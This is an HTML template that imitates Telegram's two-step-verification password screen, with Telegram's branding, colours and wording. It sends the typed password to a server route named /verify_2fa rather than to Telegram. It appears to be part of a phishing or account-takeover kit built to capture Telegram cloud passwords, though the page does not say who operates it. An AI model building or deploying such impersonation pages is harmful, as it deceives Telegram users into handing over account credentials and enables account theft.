<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 60px 20px;
        }
        .icon {
            width: 160px;
            height: 160px;
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 80px;
        }
        h1 {
            font-size: 32px;
            font-weight: 400;
            color: #000;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #707579;
            font-size: 16px;
            margin-bottom: 40px;
            text-align: center;
        }
        .input-wrapper {
            width: 100%;
            max-width: 360px;
            margin-bottom: 12px;
        }
        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border-color: #3390ec;
        }
        .error {
            color: #e53935;
            font-size: 14px;
            margin-bottom: 12px;
            text-align: center;
        }
        .btn {
            width: 100%;
            max-width: 360px;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            color: #fff;
            background: #3390ec;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #2b7cd3;
        }
        .hint {
            margin-top: 16px;
            color: #3390ec;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="icon">üîê</div>
    
    <h1>Enter Password</h1>
    <p class="subtitle">Your account is protected with<br>an additional password.</p>
    
    {% if error %}
    <p class="error">{{ error }}</p>
    {% endif %}
    
    <form action="/verify_2fa" method="POST">
        <div class="input-wrapper">
            <input type="password" name="code" class="input-field" placeholder="Password" required autofocus>
        </div>
        <button type="submit" class="btn">Next</button>
    </form>
    
    <p class="hint">Forgot password?</p>
</body>
</html>
